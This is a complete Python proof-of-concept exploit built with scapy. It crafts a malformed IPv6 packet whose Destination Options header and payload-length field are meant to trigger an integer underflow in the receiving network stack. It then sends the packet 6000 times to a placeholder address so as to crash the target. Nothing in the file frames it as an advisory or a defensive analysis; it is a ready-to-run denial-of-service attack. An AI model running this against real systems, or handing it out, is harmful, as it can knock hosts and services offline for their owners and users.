#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.inet import TCP
from scapy.layers.inet6 import PadN, IPv6ExtHdrDestOpt, IPv6

def build_poc(dst_ip):
    # create a valid-but-empty IPv6 extension header that's just 8 bytes of padding
    pad = PadN(optdata=b"\x00" * 8)

    # we'll use the Destination Options header, since it's rarely validated by routers
    ext = IPv6ExtHdrDestOpt(nh=6, options=[pad])

    # The actual content of the layer 4 packet don't matter, but port 1337 does look cool
    tcp = TCP(sport=1337, dport=80, flags="S", seq=0, ack=1, window=0x2000)

    # we set the `payload length` field to 8, and `Next Header` to 60 (Destination Options)
    # the extension header is 16-bytes total, so the 8 - 46 subtraction causes an underflow.
    ipv6 = IPv6(dst=dst_ip, nh=60, hlim=64, plen=8)

    pkt = ipv6 / ext / tcp
    return pkt

# target IPv6 address
DST_IP = "::dead:beef"

exploit_pkt = build_poc(DST_IP)

# send the exploit packet multiple times to ensure it crashes the host system
for i in range(0, 6000):
    send(exploit_pkt, verbose=False)
